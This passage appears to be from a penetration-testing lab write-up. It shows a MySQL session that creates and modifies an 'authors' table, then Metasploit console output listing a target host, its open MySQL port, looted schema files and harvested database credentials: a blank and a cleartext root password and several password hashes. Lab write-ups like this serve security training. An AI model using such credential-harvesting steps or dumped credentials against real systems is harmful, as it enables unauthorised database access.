Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| upload             |
| vendors            |
| videos             |
| warehouse          |
+--------------------+
7 rows in set (0.001 sec)

MySQL [(none)]> use warehouse;
Database changed
MySQL [warehouse]> show tables;
Empty set (0.000 sec)

MySQL [warehouse]> create table authors (author_name varchar(60), author_email varchar(70), author_pay int);
Query OK, 0 rows affected (0.003 sec)

MySQL [warehouse]> show tables;
+---------------------+
| Tables_in_warehouse |
+---------------------+
| authors             |
+---------------------+
1 row in set (0.000 sec)

MySQL [warehouse]> insert into authors(author_name, author_email, author_pay) values ('Albedo', 'albedo@gmail.com', 100000);
Query OK, 1 row affected (0.002 sec)

MySQL [warehouse]> select * from authors;
+-------------+------------------+------------+
| author_name | author_email     | author_pay |
+-------------+------------------+------------+
| Albedo      | albedo@gmail.com |     100000 |
+-------------+------------------+------------+
1 row in set (0.000 sec)

MySQL [warehouse]> update authors set author_pay=200000;
Query OK, 1 row affected (0.002 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MySQL [warehouse]> select * from authors;
+-------------+------------------+------------+
| author_name | author_email     | author_pay |
+-------------+------------------+------------+
| Albedo      | albedo@gmail.com |     200000 |
+-------------+------------------+------------+
1 row in set (0.000 sec)
```

```
msf5 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
192.34.86.3             Unknown                    device         

msf5 > services
Services
========

host         port  proto  name   state  info
----         ----  -----  ----   -----  ----
192.34.86.3  3306  tcp    mysql  open   

msf5 > loot

Loot
====

host         service  type          name                          content     info          path
----         -------  ----          ----                          -------     ----          ----
192.34.86.3  mysql    mysql_schema  192.34.86.3_mysql_schema.txt  text/plain  MySQL Schema  /root/.msf4/loot/20221212034838_default_192.34.86.3_mysql_schema_750926.txt
msf5 > creds
Credentials
===========

host         origin       service           public            private                                    realm  private_type        JtR Format
----         ------       -------           ------            -------                                    -----  ------------        ----------
192.34.86.3  192.34.86.3  3306/tcp (mysql)  root                                                                Blank password      
192.34.86.3  192.34.86.3  3306/tcp (mysql)  root              *A0E23B565BACCE3E70D223915ABF2554B2540144         Nonreplayable hash  mysql,mysql-sha1
192.34.86.3  192.34.86.3  3306/tcp (mysql)  root              twinkle                                           Password            
192.34.86.3  192.34.86.3  3306/tcp (mysql)  debian-sys-maint  *F4E71A0BE028B3688230B992EEAC70BC598FA723         Nonreplayable hash  mysql,mysql-sha1
192.34.86.3  192.34.86.3  3306/tcp (mysql)  filetest          *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B         Nonreplayable hash  mysql,mysql-sha1
192.34.86.3  192.34.86.3  3306/tcp (mysql)  ultra             *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29         Nonreplayable hash  mysql,mysql-sha1
192.34.86.3  192.34.86.3  3306/tcp (mysql)  guest             *17FD2DDCC01E0E66405FB1BA16F033188D18F646         Nonreplayable hash  mysql,mysql-sha1
192.34.86.3  192.34.86.3  3306/tcp (mysql)  gopher            *027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0         Nonreplayable hash  mysql,mysql-sha1
192.34.86.3  192.34.86.3  3306/tcp (mysql)  backup            *E6DEAD2645D88071D28F004A209691AC60A72AC9         Nonreplayable hash  mysql,mysql-sha1
192.34.86.3  192.34.86.3  3306/tcp (mysql)  sysadmin          *78A1258090DAA81738418E11B73EB494596DFDD3         Nonreplayable hash  mysql,mysql-sha1
```

